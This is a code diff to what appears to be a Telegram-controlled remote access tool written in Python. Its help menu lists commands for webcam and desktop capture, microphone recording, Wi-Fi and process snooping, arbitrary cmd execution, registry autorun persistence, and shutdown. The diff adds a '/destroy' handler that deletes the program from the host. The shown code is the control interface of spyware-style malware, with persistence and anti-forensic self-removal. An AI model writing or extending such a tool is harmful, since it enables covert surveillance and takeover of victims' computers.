@@ -19,20 +19,23 @@ except DeprecationWarning:
 
 @dp.message_handler(commands="help")
 async def support(message: types.Message):
-    await message.answer(f'\nCommand List:\n'
-                         f'/check - Checking System Status\n'
-                         f'/pc_info - System characteristics\n'
-                         f'/con_info - Connection characteristics\n'
-                         f'/proc_info - List of running processes\n'
-                         f'/wifi_info - Information about Wi-Fi connections\n'
-                         f'/pub_ip_info - Information about public IP address\n'
-                         f'/screen - Desktop screenshot\n'
-                         f'/webcam_screen - Webcam screen\n'
-                         f'/audio n - (n - count of seconds)Record sound from voice recorder for 5 seconds by default\n'
-                         f'/exec c - (c - command) Execute command in cmd\n'
-                         f'/reg_autorun - Append programme to registry\n'
-                         f'/del_autorun - Delete programme from registry\n'
-                         f'/exit - Shutting down the program before reboot\n')
+    await message.answer(
+        f'\nCommand List:\n'
+        f'/check - Checking System Status\n'
+        f'/pc_info - System characteristics\n'
+        f'/con_info - Connection characteristics\n'
+        f'/proc_info - List of running processes\n'
+        f'/wifi_info - Information about Wi-Fi connections\n'
+        f'/pub_ip_info - Information about public IP address\n'
+        f'/screen - Desktop screenshot\n'
+        f'/webcam_screen - Webcam screen\n'
+        f'/audio n - (n - count of seconds)Record sound from voice recorder for 5 seconds by default\n'
+        f'/exec c - (c - command) Execute command in cmd\n'
+        f'/reg_autorun - Append programme to registry\n'
+        f'/del_autorun - Delete programme from registry\n'
+        f'/exit - Shutting down the program before reboot\n'
+        f'/destroy - Delete the program from the computer\n'
+    )
 
 
 @dp.message_handler(commands="reg_autorun")
@@ -131,3 +134,9 @@ async def cmd_exec(message: types.Message):
 async def cmd_exit(message: types.Message):
     await message.answer("Goodbye!")
     raise SystemExit
+
+
+@dp.message_handler(commands="destroy")
+async def red_button(message: types.Message):
+    await message.answer("I'm going to miss you!")
+    modules.Destroyer().delete_the_program()
